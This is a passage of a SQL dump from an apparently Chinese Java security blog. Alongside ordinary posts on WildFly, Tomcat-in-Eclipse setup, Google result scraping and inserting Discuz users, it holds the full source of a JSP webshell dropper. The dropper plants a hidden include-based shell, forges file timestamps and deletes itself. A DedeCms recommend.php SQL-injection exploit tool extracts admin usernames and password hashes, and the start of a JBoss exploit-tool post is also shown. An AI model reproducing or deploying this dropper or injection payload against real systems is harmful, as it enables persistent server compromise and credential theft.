12:43:11&quot;).getTime():f.lastModified();StringBuilder sb=new StringBuilder();BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f, append),&quot;UTF-8&quot;));bw.write(content);bw.flush();bw.close();f.setLastModified(lastModified);}void writeMetaInfFile(String path,String c) throws Exception{File f=new File(path+File.separator+&quot;META-INF&quot;);if(!f.exists()){f.mkdirs();}writeStringToFile(new File(f,&quot;applicationContext.properties&quot;),c,&quot;UTF-8&quot;,false);}void writeShell(String root,File file, String c) throws Exception{writeStringToFile(file,&quot;&lt;%@ include file=\\&quot;/META-INF/applicationContext.properties\\&quot; %&quot;+&quot;&gt;&quot;,&quot;UTF-8&quot;,false);writeMetaInfFile(root.toString(),c);}String startX(File file, String basePath,String c) throws Exception{File[] f=file.listFiles();String sb=getPath(file);File p=new File(sb!=null?sb:file.toString(),&quot;applicationContext.jsp&quot;);writeShell(file.toString(),p,c);return p.toString();}String getRequestFileRealPath(HttpServletRequest request){String webRoot=(request.getSession().getServletContext().getRealPath(&quot;/&quot;).replaceAll(&quot;\\\\\\\\&quot;,&quot;/&quot;)+&quot;/&quot;).replaceAll(&quot;/+&quot;,&quot;/&quot;),context=request.getContextPath(),uri=request.getRequestURI().replaceAll(&quot;/+&quot;,&quot;/&quot;),filePath = (webRoot+uri).replaceAll(&quot;/+&quot;,&quot;/&quot;);if(!&quot;&quot;.equals(context)&amp;&amp;webRoot.endsWith(context+&quot;/&quot;)){return webRoot.substring(0,webRoot.indexOf(context))+uri;}else{if(uri.split(&quot;/&quot;).length&gt;1){String[] c=uri.split(&quot;/&quot;);if(!new File(webRoot+c[1]).exists()){return (webRoot+(uri.replaceFirst(c[1],&quot;&quot;))).replaceAll(&quot;/+&quot;,&quot;/&quot;);}}}return filePath;}String getPath(File file){File[] f = file.listFiles();for (File a:f){if (a.isDirectory()&amp;&amp;!a.toString().contains(&quot;WEB-INF&quot;)&amp;&amp;!a.toString().contains(&quot;META-INF&quot;)){return a.toString();}}return null;}%&gt;&lt;%try{String path=request.getContextPath();String basePath=request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;File root=new File(application.getRealPath(&quot;/&quot;));String p = startX(root,basePath,request.getParameter(&quot;c&quot;));out.println(&quot;[path:&quot;+basePath+(p.toString().replace(root.toString(),&quot;&quot;).replaceAll(&quot;\\\\\\\\&quot;,&quot;/&quot;).replaceFirst(&quot;/&quot;,&quot;&quot;).replaceAll(&quot;/+&quot;,&quot;/&quot;))+&quot;]&quot;);new File(getRequestFileRealPath(request)).delete();}catch(Exception e){out.println(&quot;[/ok]&quot;);}%&gt;</pre>\n<strong>zsy.jsp:</strong>\n<pre class=\"brush: java; gutter: true\">&lt;%@page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot;%&gt;\n&lt;%@page import=&quot;java.text.SimpleDateFormat&quot;%&gt;\n&lt;%@page import=&quot;java.io.*&quot;%&gt;\n&lt;%@page import=&quot;java.net.*&quot;%&gt;\n&lt;%!\n	String getConnection(String url) throws Exception{\n		String result = &quot;&quot;, line = &quot;&quot;;\n		URLConnection connection = new URL(url).openConnection();\n		connection.setConnectTimeout(15000);\n		connection.setReadTimeout(15000);\n		BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n		while ((line = in.readLine()) != null) {\n			result += line;\n		}\n		return result;\n	}\n	void writeStringToFile(File f, String content, String encode, boolean append) throws Exception{\n		long lastModified = !f.exists() ? new SimpleDateFormat(&quot;yyyy-mm-dd HH:mm:ss&quot;).parse(&quot;2012-03-14 12:43:11&quot;).getTime(): f.lastModified();\n		StringBuilder sb = new StringBuilder();\n		BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f, append), &quot;UTF-8&quot;));\n		bw.write(content);\n		bw.flush();\n		bw.close();\n		f.setLastModified(lastModified);\n	}\n	void writeMetaInfFile(String path,String c) throws Exception {\n		File f = new File(path+File.separator+&quot;META-INF&quot;);\n		if(!f.exists()){\n			f.mkdirs();\n		}\n		writeStringToFile(new File(f,&quot;applicationContext.properties&quot;),c, &quot;UTF-8&quot;, false);\n	}\n	void writeShell(String root,File file, String c) throws Exception{\n		writeStringToFile(file,&quot;&lt;%@ include file=\\&quot;/META-INF/applicationContext.properties\\&quot; %&quot;+&quot;&gt;&quot;, &quot;UTF-8&quot;, false);\n		writeMetaInfFile(root.toString(),c);\n	}\n	String getPath(File file){\n		File[] f = file.listFiles();\n		for (File a : f) {\n			if (a.isDirectory()&amp;&amp;!a.toString().contains(&quot;WEB-INF&quot;)&amp;&amp;!a.toString().contains(&quot;META-INF&quot;)) {\n				return a.toString();\n			}\n		}\n		return null;\n	}\n	String startX(File file, String basePath, String c) throws Exception {\n		File[] f = file.listFiles();\n		String sb = getPath(file);\n		File p = new File(sb != null ? sb : file.toString(),&quot;applicationContext.jsp&quot;);\n		writeShell(file.toString(), p, c);\n		return p.toString();\n	}\n	String getRequestFileRealPath(HttpServletRequest request){\n		String webRoot = (request.getSession().getServletContext().getRealPath(&quot;/&quot;).replaceAll(&quot;\\\\\\\\&quot;, &quot;/&quot;)+&quot;/&quot;).replaceAll(&quot;/+&quot;, &quot;/&quot;),\n			   context = request.getContextPath(), \n			   uri = request.getRequestURI().replaceAll(&quot;/+&quot;, &quot;/&quot;),\n			   filePath = (webRoot+uri).replaceAll(&quot;/+&quot;, &quot;/&quot;);\n		if(!&quot;&quot;.equals(context)&amp;&amp;webRoot.endsWith(context+&quot;/&quot;)){\n			return webRoot.substring(0,webRoot.indexOf(context))+uri;\n		}else{\n			if(uri.split(&quot;/&quot;).length&gt;1){\n				String[] c = uri.split(&quot;/&quot;);\n				if(!new File(webRoot+c[1]).exists()){\n					return (webRoot+(uri.replaceFirst(c[1], &quot;&quot;))).replaceAll(&quot;/+&quot;, &quot;/&quot;);\n				}\n			}\n		}\n		return filePath;\n	}\n%&gt;\n&lt;%\n	try{\n		String path = request.getContextPath();\n		String basePath = request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;\n		File root = new File(application.getRealPath(&quot;/&quot;));\n		String p = startX(root, basePath,request.getParameter(&quot;c&quot;));\n		out.println(&quot;[path:&quot;+basePath+(p.toString().replace(root.toString(),&quot;&quot;).replaceAll(&quot;\\\\\\\\&quot;,&quot;/&quot;).replaceFirst(&quot;/&quot;,&quot;&quot;).replaceAll(&quot;/+&quot;,&quot;/&quot;))+&quot;]&quot;);\n		new File(getRequestFileRealPath(request)).delete();\n	}catch(Exception e){\n		out.println(&quot;[/ok]&quot;);\n	}\n%&gt;</pre>', null, '2014-02-27 00:12:57', '1', '664', null, '0', '2014-02-27 01:43:31'), ('788', '1', '20', 'Jboss WildFly 8 Undertow', '园长', 'Jboss官网最新版本是Jboss7，以前没注意原来WildFly 8就是Jboss8.Jboss那货改名了。\n<p><a href=\"http://www.jboss.org/jbossas/downloads/\">Jboss下载地址</a> <a href=\"http://wildfly.org/downloads/\">WildFly下载地址</a></p>\n<p><h3><a href=\"http://gaotong1991.iteye.com/blog/2022539\">高性能非阻塞Web 服务器Undertow</a></h3></p>\n<p><h3>概述</h3></p>\n<p>WildFly 8 包含了一个全新的Web服务器（Undertow），WildFly 8 默认的Web服务器为Undertow。一句话概括什么是Undertow - 高性能非阻塞 Web 服务器。Undertow 主要有以下几个特点：</p>\n<p><ul></p>\n<p>	<li>轻量化 - Undertow 是一个Web 服务器，但它不像传统的Web 服务器有容器的概念，它由两个核心jar包组成，使用API加载一个Web应用可以使用小于10MB的内存</li></p>\n<p>	<li>HTTP Upgrade 支持 - 设计WildFly时一个重要的考虑因素是在云环境中减少端口数量的需求。在云环境中，一个系统可能运行了几百个甚至几千个WildFly实例。基于HTTP使用HTTP Upgrade可以升级成多种协议，Undertow提供了复用这些协议的能力。</li></p>\n<p>	<li>Web Socket 支持 - 对Web Socket的完全支持，用以满足Web应用现在面对巨大数量的客户端，以及对JSR-356规范的支持</li></p>\n<p>	<li>Servlet 3.1 的支持 - Undertow支持Servlet 3.1，提供了一个机会来构建一个超越Servlet规范、对开发人员非常友好的系统。</li></p>\n<p>	<li>可嵌套性 - Web 服务器不在需要容器，我们只需要通过API在J2SE代码下快速搭建Web服务</li></p>\n<p></ul></p>\n<p>原文：http://gaotong1991.iteye.com/blog/2022539</p>\n<p><a href=\"http://www.oschina.net/question/236203_130449\"><strong>JBoss AS JBoss EAP wildfly：</strong></a></p>\n<p>JBoss AS 开源社区版本，发布比较频繁。JBoss 7 ，先后发布了 7.0.0, 7.0.1, 7.0.2, 7.1.0, 7.1.1, 7.1.2, 7.1.3, 7.2.0，其中 7.1.1 比较经典，7.2.0 是 JBoss EAP 6.1 的基础，但7.1.2, 7.1.3, 7.2.0 只是源代码打了 Tag，并没提供开放下载。</p>\n<p>JBoss EAP（Enterprise Application Platform） 在开源版本上构建的企业版本，目前Redhat 已经将 JBoss EAP 放在 JBoss.org 开放下载，开发人无需注册 Redhat （之前是必须有 Redhat.com 账号才能下载 JBoss EAP）。商用请咨询 Redhat 客服。</p>\n<p>Wildfly 是 JBoss AS 新的项目名称，<strong>从 8 开始，新的 JBoss AS 正式有一个名字，叫 WildFly</strong>， 目前已经发布 8 Beta 版本，针对开发人员的 Java EE 7 功能已经完全实现。</p>', null, '2014-02-27 11:33:02', '1', '757', null, '0', '2014-02-27 11:36:10'), ('794', '1', '15', 'Tomcat7源码eclipse(mvn)', '园长', '打包好的eclipse项目下载：<a href=\"http://pan.baidu.com/s/1sjJaVyX\">Tomcat7.0.zip</a>\n<p>需要先分别Tomcat7二进制文件下载：<a href=\"http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.52/bin/apache-tomcat-7.0.52.zip\">apache-tomcat-7.0.52.zip</a> 和 Tomcat7源文件： <a href=\"http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.52/src/apache-tomcat-7.0.52-src.zip\">apache-tomcat-7.0.52-src.zip</a>。然后需要安装好maven环境：<a href=\"http://maven.apache.org/download.cgi\">Maven</a>。参考原文：http://zhh2009.iteye.com/blog/1557891</p>\n<p>新建一个Tomcat7目录，解压apache-tomcat-7.0.52.zip到Tomcat7目录并更改apache-tomcat-7.0.52为 trunk，解压apache-tomcat-7.0.52-src.zip到Tomcat7目录并更改apache-tomcat-7.0.52-src为launch。用这个二进制分发包而不是从源代码构建只是为了节省时间，直接用它conf目录里面的配置文件和webapps下的例子。</p>\n<p>新建pom.xml,内容：</p>\n<pre class=\"brush: xml; gutter: true\">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n	xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;&gt;\n	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n	&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;\n	&lt;artifactId&gt;Tomcat7.0&lt;/artifactId&gt;\n	&lt;name&gt;Tomcat7.0&lt;/name&gt;\n	&lt;version&gt;7.0&lt;/version&gt;\n	&lt;build&gt;\n		&lt;finalName&gt;Tomcat7.0&lt;/finalName&gt;\n		&lt;sourceDirectory&gt;trunk/java&lt;/sourceDirectory&gt;\n		&lt;testSourceDirectory&gt;trunk/test&lt;/testSourceDirectory&gt;\n		&lt;resources&gt;\n			&lt;resource&gt;\n				&lt;directory&gt;trunk/java&lt;/directory&gt;\n			&lt;/resource&gt;\n		&lt;/resources&gt;\n		&lt;testResources&gt;\n			&lt;testResource&gt;\n				&lt;directory&gt;trunk/test&lt;/directory&gt;\n			&lt;/testResource&gt;\n		&lt;/testResources&gt;\n		&lt;plugins&gt;\n			&lt;plugin&gt;\n				&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n				&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\n				&lt;version&gt;2.3&lt;/version&gt;\n				&lt;configuration&gt;\n					&lt;source&gt;1.6&lt;/source&gt;\n					&lt;target&gt;1.6&lt;/target&gt;\n				&lt;/configuration&gt;\n			&lt;/plugin&gt;\n		&lt;/plugins&gt;\n	&lt;/build&gt;\n	&lt;dependencies&gt;\n		&lt;dependency&gt;\n			&lt;groupId&gt;junit&lt;/groupId&gt;\n			&lt;artifactId&gt;junit&lt;/artifactId&gt;\n			&lt;version&gt;4.4&lt;/version&gt;\n			&lt;scope&gt;test&lt;/scope&gt;\n		&lt;/dependency&gt;\n		&lt;dependency&gt;\n			&lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt;\n			&lt;artifactId&gt;ecj&lt;/artifactId&gt;\n			&lt;version&gt;3.7.2&lt;/version&gt;\n		&lt;/dependency&gt;\n		&lt;dependency&gt;\n			&lt;groupId&gt;ant&lt;/groupId&gt;\n			&lt;artifactId&gt;ant&lt;/artifactId&gt;\n			&lt;version&gt;1.7.0&lt;/version&gt;\n		&lt;/dependency&gt;\n		&lt;dependency&gt;\n			&lt;groupId&gt;wsdl4j&lt;/groupId&gt;\n			&lt;artifactId&gt;wsdl4j&lt;/artifactId&gt;\n			&lt;version&gt;1.6.2&lt;/version&gt;\n		&lt;/dependency&gt;\n		&lt;dependency&gt;\n			&lt;groupId&gt;javax.xml&lt;/groupId&gt;\n			&lt;artifactId&gt;jaxrpc&lt;/artifactId&gt;\n			&lt;version&gt;1.1&lt;/version&gt;\n		&lt;/dependency&gt;\n	&lt;/dependencies&gt;\n&lt;/project&gt;</pre>\n<p>在命令行窗口中进入Tomcat7目录，执行 mvn eclipse:eclipse 就可以转成eclipse工程项目了，然后打开eclipse，点\"File-&gt;Import-&gt;General-&gt;Existing Projects into Workspace\"，最后打开Tomcat7就能看到Tomcat7.0这个项目了。</p>\n<p>在Eclipse中打开org.apache.catalina.startup.Bootstrap类，</p>\n<p>在编辑区右击，点\"Run As-&gt;Run configurations\"，然后双击\"Java Aplication\"就会出来一个新的\"Bootstrap\"，</p>\n<p>选中它，在右边点击\"Arguments\"那一栏，把下面的内容copy到\"VM arguments\"中:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/16.jpg\"><img class=\"alignnone size-full wp-image-795\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/02/16.jpg\" alt=\"\" width=\"812\" height=\"640\" /></a></p>\n<pre class=\"brush: actionscript3; gutter: true\">-Dcatalina.home=launch -Dcatalina.base=launch -Djava.endorsed.dirs=launch/endorsed -Djava.io.tmpdir=launch/temp -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.util.logging.config.file=launch/conf/logging.properties</pre>\n除上面这种方式外，这里还有一个Eclipse的launch脚本：\nstart-tomcat7.launch\n<pre class=\"brush: xml; gutter: true\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;\n&lt;launchConfiguration type=&quot;org.eclipse.jdt.launching.localJavaApplication&quot;&gt;\n&lt;listAttribute key=&quot;org.eclipse.debug.core.MAPPED_RESOURCE_PATHS&quot;&gt;\n&lt;listEntry value=&quot;/Tomcat7.0/trunk/java/org/apache/catalina/startup/Bootstrap.java&quot;/&gt;\n&lt;/listAttribute&gt;\n&lt;listAttribute key=&quot;org.eclipse.debug.core.MAPPED_RESOURCE_TYPES&quot;&gt;\n&lt;listEntry value=&quot;1&quot;/&gt;\n&lt;/listAttribute&gt;\n&lt;stringAttribute key=&quot;org.eclipse.jdt.launching.MAIN_TYPE&quot; value=&quot;org.apache.catalina.startup.Bootstrap&quot;/&gt;\n&lt;stringAttribute key=&quot;org.eclipse.jdt.launching.PROGRAM_ARGUMENTS&quot; value=&quot;start&quot;/&gt;\n&lt;stringAttribute key=&quot;org.eclipse.jdt.launching.PROJECT_ATTR&quot; value=&quot;Tomcat7.0&quot;/&gt;\n&lt;stringAttribute key=&quot;org.eclipse.jdt.launching.VM_ARGUMENTS&quot; value=&quot;-Dcatalina.home=launch -Dcatalina.base=launch -Djava.endorsed.dirs=launch/endorsed -Djava.io.tmpdir=launch/temp -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.util.logging.config.file=launch/conf/logging.properties&quot;/&gt;\n&lt;/launchConfiguration&gt;</pre>', null, '2014-02-27 16:18:05', '1', '702', null, '0', '2014-02-27 16:18:57'), ('798', '1', '12', 'DedeCms recommend.php注入利用工具', '园长', '本地下载：<a href=\"http://javaweb.org/wp-content/uploads/2014/02/DedeCms-recommend.php注入利用工具.jar_.zip\">DedeCms recommend.php注入利用工具.jar</a>\n<p>输出的md5已处理，直接拿去破解就行了，祝你好运。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/17.jpg\"><img class=\"alignnone size-full wp-image-799\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/02/17.jpg\" alt=\"\" width=\"460\" height=\"318\" /></a></p>\n<p>源码：</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.dede.ui;\nimport java.awt.Toolkit;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n/**\n *\n * @author yz\n */\npublic class MainFrame extends javax.swing.JFrame {\n	private static final long serialVersionUID = 1L;\n	/**\n     * Creates new form MainFrame\n     */\n    public MainFrame() {\n        initComponents();\n    }\n    public String request(String url){\n    	String str = &quot;&quot;,tmp;\n		try {\n			BufferedReader br = new BufferedReader(new InputStreamReader(new URL(url).openStream()));\n			while((tmp=br.readLine())!=null){\n				str+=tmp+&quot;\\r\\n&quot;;\n			}\n		} catch (Exception e) {\n			jTextArea1.setText(e.toString());\n		}\n		return str;\n	}\n    private void initComponents() {\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jTextField1 = new javax.swing.JTextField();\n        jButton1 = new javax.swing.JButton();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jTextArea1 = new javax.swing.JTextArea();\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        jLabel1.setText(&quot;URL:&quot;);\n        jTextField1.setText(&quot;http://localhost&quot;);\n        this.setTitle(&quot;DedeCms recommend.php注入利用工具-p2j.cn&quot;);\n        int screenWidth = Toolkit.getDefaultToolkit().getScreenSize().width;\n        int screenHeight = Toolkit.getDefaultToolkit().getScreenSize().height;\n        this.setBounds(screenWidth / 2 - 229, screenHeight / 2 - 158, 458, 316);\n        jButton1.setText(&quot;获取&quot;);\n        jButton1.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton1ActionPerformed(evt);\n            }\n        });\n        jTextArea1.setColumns(20);\n        jTextArea1.setRows(5);\n        jScrollPane1.setViewportView(jTextArea1);\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)\n                    .addComponent(jScrollPane1, javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanel1Layout.createSequentialGroup()\n                        .addContainerGap()\n                        .addComponent(jLabel1)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                        .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, 331, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                        .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 83, javax.swing.GroupLayout.PREFERRED_SIZE)))\n                .addGap(0, 0, Short.MAX_VALUE))\n        );\n        jPanel1Layout.setVerticalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jLabel1)\n                    .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jButton1))\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 254, Short.MAX_VALUE))\n        );\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n        );\n        pack();\n    }// &lt;/editor-fold&gt;                        \n    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {                                         \n    	String url = jTextField1.getText();\n		if(null==url||&quot;&quot;.equals(url)){\n			return ;\n		}\n		String result = request(url+&quot;/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\\\\%27%20or%20mid=@`\\\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\\\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294&quot;);\n		Matcher m = Pattern.compile(&quot;&lt;h2&gt;(.*)&lt;/h2&gt;&quot;).matcher(result);\n		if(m.find()){\n			String[] s = m.group(1).split(&quot;\\\\|&quot;);\n			if(s.length&gt;2){\n				jTextArea1.setText(&quot;UserName:&quot;+s[1]+&quot;\\r\\nMD5:&quot;+s[2].substring(3,s[2].length()-1));\n			}\n		}\n    }                                        \n    public static void main(String args[]) {\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new MainFrame().setVisible(true);\n            }\n        });\n    }\n    // Variables declaration - do not modify                     \n    private javax.swing.JButton jButton1;\n    private javax.swing.JLabel jLabel1;\n    private javax.swing.JPanel jPanel1;\n    private javax.swing.JScrollPane jScrollPane1;\n    private javax.swing.JTextArea jTextArea1;\n    private javax.swing.JTextField jTextField1;\n    // End of variables declaration                   \n}</pre>\n<p>Java标准的环境变量配置：</p>\n<pre class=\"brush: java; gutter: true\">JAVA_HOME地址：C:\\Program Files\\Java\\jdk1.7.0_51\nCLASS_PATH地址：%JAVA_HOME%\\lib\npath最后面添加：;%JAVA_HOME%\\bin</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/18.jpg\"><img class=\"alignnone size-full wp-image-805\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/02/18.jpg\" alt=\"\" width=\"943\" height=\"521\" /></a></p>', null, '2014-02-28 01:36:41', '1', '709', null, '13', '2014-05-14 16:39:49'), ('807', '1', '3', 'google hack-简单页面URL采集', '园长', '采集Google的URL方式多重多样，最简单的方式莫过于js直接获取节点了。比如：\n<pre class=\"brush: javascript; gutter: true\">var h3 = document.getElementsByTagName(&#039;h3&#039;);\nfor(var i=0;i&lt;h3.length;i++){\n    var a = h3[i]. getElementsByTagName(&#039;a&#039;);\n    console.log(a[0].href);\n}</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/1.jpg\"><img class=\"alignnone size-full wp-image-808\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/1.jpg\" alt=\"\" width=\"792\" height=\"667\" /></a></p>\n<p>在java里面用jsoup也可以非常简单的获取到搜索结果的URL：</p>\n<pre class=\"brush: java; gutter: true\">public static void main(String[] args) throws IOException {\n		Document doc = Jsoup.connect(&quot;https://www.google.ws/search?num=100&amp;site=&amp;source=hp&amp;q=filetype%3Ajsp&amp;oq=filetype%3Ajsp&amp;gs_l=hp.3...8115.14780.0.15194.22.21.1.0.0.0.523.5187.3j3j3j5j4j1.19.0....0...1c.1.36.hp..14.8.1440.P_2EQhc7Pz0&quot;).userAgent(&quot;Googlebot/2.1 (+http://www.googlebot.com/bot.html)&quot;).timeout(5000).get();\n		Elements element = doc.getElementsByTag(&quot;h3&quot;);\n		for (Element e : element) {\n			Matcher m= Pattern.compile(&quot;/url\\\\?q=(.*)&amp;sa&quot;).matcher(e.getElementsByTag(&quot;a&quot;).get(0).attr(&quot;href&quot;));\n			if(m.find()){\n				System.out.println(URLDecoder.decode(m.group(1),&quot;UTF-8&quot;));\n			}\n		}\n	}</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/21.jpg\"><img class=\"alignnone size-full wp-image-812\" title=\"2\" src=\"http://javaweb.org/wp-content/uploads/2014/03/21.jpg\" alt=\"\" width=\"1027\" height=\"437\" /></a></p>\n<p>正则：</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.test;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\npublic class TestReg {\n    public static void main(String[] args) {\n        String source=&quot;&lt;h3 class=\\&quot;r\\&quot;&gt;&lt;a href=\\&quot;http://baidu.com\\&quot;&gt;百度&lt;/a&gt;&lt;/h3&gt;&lt;h3 class=\\&quot;r\\&quot;&gt;&lt;a href=\\&quot;http://google.com\\&quot;&gt;谷歌&lt;/a&gt;&lt;/h3&gt; &quot;;\n        StringBuilder resultComment=new StringBuilder();\n        StringBuilder resultName=new StringBuilder();\n        System.out.println(&quot;=======开始匹配========&quot;);\n        String patternStrs=&quot;(&lt;h3 class=\\&quot;r\\&quot;&gt;&lt;a.+?)href=\\&quot;(.+?)\\&quot;&gt;(.+?)(&lt;/a&gt;&lt;/h3&gt;)&quot;;\n        Pattern pattern=Pattern.compile(patternStrs);\n        Matcher matcher=pattern.matcher(source);\n        while(matcher.find()){\n            resultName.append(matcher.group(2)+&quot;\\n&quot;);\n            resultComment.append(matcher.group(3)+&quot;\\n&quot;);\n        }\n        System.out.println(&quot;=======标签内内容=======&quot;);\n        System.out.println(resultComment.toString());\n        System.out.println(&quot;=======name属性值=======&quot;);\n        System.out.println(resultName.toString());\n    }\n}</pre>', null, '2014-03-03 17:04:42', '1', '697', null, '1', '2014-03-23 16:09:59'), ('814', '1', '17', 'java简单添加discuz用户', '园长', '朋友需要这么个功能，非常简单的写了个。有用到的朋友<strong>自己加用户是否存在</strong>等判断、这里<strong>未做同步</strong>只是实现了下逻辑。Discuz直接插入到<span style=\"font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;\">pre_ucenter_members(默认前缀pre，根据自己实际情况)。</span>\n<pre class=\"brush: java; gutter: true\">import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.util.Date;\nimport java.util.Random;\nimport org.apache.commons.codec.digest.DigestUtils;\npublic class Discuz {\n	public String getRandomString(int length) {\n		String base = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;;\n		Random random = new Random();\n		StringBuffer sb = new StringBuffer();\n		for (int i = 0; i &lt; length; i++) {\n			int number = random.nextInt(base.length());\n			sb.append(base.charAt(number));\n		}\n		return sb.toString();\n	}\n	public String Encryptions(String pwd, String salt) {\n		return DigestUtils.md5Hex(DigestUtils.md5Hex(pwd) + salt).toString();\n	}\n	public void addUser() {\n		try{\n			Class.forName(&quot;com.mysql.jdbc.Driver&quot;);\n			String salt = getRandomString(6);//随机的salt\n			String pwd = Encryptions(&quot;123456&quot;, salt);//混合salt加密后的密码\n			Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/bbs&quot;,&quot;root&quot;,&quot;root&quot;);\n			int i = conn.prepareStatement(&quot;insert into pre_ucenter_members (username,password,email,regip,regdate,salt) values (&#039;test&#039;,&#039;&quot;+pwd+&quot;&#039;,&#039;admin@163.com&#039;,&#039;127.0.0.1&#039;,&#039;&quot;+Math.round(new Date().getTime()/1000)+&quot;&#039;,&#039;&quot;+salt+&quot;&#039;)&quot;).executeUpdate();\n			System.out.println(i&gt;0?&quot;添加成功!&quot;:&quot;添加失败.&quot;);\n		}catch(Exception e){\n			System.out.println(e.toString());\n		}\n	}\n	public static void main(String[] args) {\n		new Discuz().addUser();\n	}\n}</pre>', null, '2014-03-05 11:56:45', '1', '685', null, '0', '2014-03-05 12:00:26'), ('820', '1', '20', 'Jboss JMX/EJBInvokerServlet、HtmlAdaptor漏洞利用工具', '园长', '<pre class=\"brush: actionscript3; gutter: true\">免责声明：本站提供的所有工具及代码仅供交流学习，不得用于商业或黑客行为。</pre>\n下载地址:<a href=\"http://pan.baidu.com/s/1sjoaTIl\">Jboss漏洞利用工具.jar</a> 链接:  密码: ucdl\n功能说明:\n<pre class=\"brush: actionscript3; gutter: true\">安装jdk并配置好环境变量,然后填好参数先点获取即可，成功后会返回&quot;请求成功.&quot;。\n1、JMX/EJBInvokerServlet:\n	host写IP或域名:127.0.0.1/p2j.cn\n	port必填,如:8080\n2、HtmlAdaptor:\n	host写URL地址:http://localhost:8080\n	